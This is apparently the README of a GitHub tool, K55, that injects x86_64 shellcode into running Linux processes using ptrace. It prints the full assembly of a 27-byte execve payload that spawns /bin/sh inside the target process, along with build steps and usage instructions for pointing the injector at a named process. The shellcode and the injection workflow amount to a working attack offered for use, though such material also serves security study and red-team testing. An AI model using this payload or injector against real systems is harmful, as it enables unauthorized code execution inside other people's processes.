## K55 - Linux x86_64 Process Injection Utility (C++11)

## About K55 
The K55 payload injection tool is used for injecting x86_64 shellcode payloads into running processes. The utility was developed using modern C++11 techniques as well as some traditional C linux functions like ``ptrace()``. The shellcode spawned in the target process is 27 bytes and it executes /bin/sh (spawns a bash shell) within the target's address space.<br/>

## Assembly of The Payload
```asm
main:
    xor eax, eax
    mov rbx, 0xFF978CD091969DD1
    neg rbx
    push rbx
    push rsp
    pop rdi
    cdq
    push rdx
    push rdi
    push rsp
    pop rsi
    mov al, 0x3b
    syscall
```


## Installation
1. ``git clone https://github.com/josh0xA/K55.git``<br/>
2. ``cd K55``<br/>
3. ``chmod +x build-install.sh``<br/>
4. ``./build-install.sh``<br/>

## K55 Usage
``Usage: ./K55 <process-name>``<br/>
- process-name can be any linux process with ``r-xp`` or ``execstack`` permissions. <br/>

### Tests
Test 1) In one terminal (K55/ Directory), run: ``./k55_example_process/k55_test_process``<br/>
Test 2) In another terminal, run the injector: ``./K55 k55_test_process``<br/>
